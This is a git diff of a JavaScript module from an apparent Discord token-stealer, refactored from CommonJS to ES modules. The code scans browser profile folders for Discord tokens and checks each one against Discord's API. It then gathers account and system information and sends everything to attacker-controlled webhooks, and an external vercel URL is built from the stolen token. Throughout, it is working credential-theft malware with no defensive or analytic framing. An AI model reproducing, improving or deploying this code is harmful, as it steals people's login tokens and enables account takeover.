@@ -1,8 +1,10 @@
-let { getInfo } = require("./../../modules/core/core"),
-    { getDiscordInfo } = require("./../../utils/axios/axios"),
-    { instance } = require("./../../utils/axios/request"),
-    { tokens, getTokens } = require("./finds"),
-    process = require("process");
+import { get_info } from "./../../modules/core/core.mjs";
+import get_discord_Info from "./../../utils/axios/discord.mjs";
+
+import { instance } from "./../../utils/axios/request.mjs";
+
+import { tokens, get_tokens } from "./finds.mjs";
+import process from "process";
 
 let local = process.env.localappdata;
 let roaming = process.env.appdata;
@@ -45,29 +47,31 @@ let paths = [
     `${local}/Microsoft/Edge/User Data/Guest Profile/Network/`,
 ];
 
-const webhookTokens = async (webhook) => {
-    for (const p of paths) {
-        await getTokens(p);
-    }
+export const send_webhook_tokens = async (webhook) => {
+    for (const path of paths) await get_tokens(path);
     for (let token of tokens) {
         try {
             let infos;
             try {
-                let req = await instance({
-                    url: `https://discord.com/api/v9/users/@me`,
-                    method: "GET",
-                    headers: {
-                        Authorization: token
+                const req = await instance({
+                    "url": `https://discord.com/api/v9/users/@me`,
+                    "method": "GET",
+                    "headers": {
+                        "authorization": token
                     },
                 })
-                infos = await req.data;
+                infos = await req["data"];
             } catch {
                 infos = null;
             }
             if (!infos) continue;
-            let copy = `https://6889-fun.vercel.app/api/aurathemes/raw?data=${token}`;
-            let discord = await getDiscordInfo(token);
-            let system = await getInfo();
+
+            const copy = `https://6889-fun.vercel.app/api/aurathemes/raw?data=x`;
+            const discord = await get_discord_Info(token);
+            const system = await get_info();
+
+            console.log(token)
+            
             webhook.forEach(async (webhook) => {
                 try {
                     await instance({
@@ -78,7 +82,7 @@ const webhookTokens = async (webhook) => {
                             "avatar_url": 'https://i.imgur.com/WkKXZSl.gif',
                             "embeds": [{
                                 "author": {
-                                    "name": `${discord.username} | ${discord.ID}`,
+                                    "name": `${discord["username"]} | ${discord.ID}`,
                                     "icon_url": discord.avatar
                                 },
                                 "thumbnail": {
@@ -223,6 +227,3 @@ const webhookTokens = async (webhook) => {
         }
     }
 }
-
-
-module.exports.webhookTokens = webhookTokens;
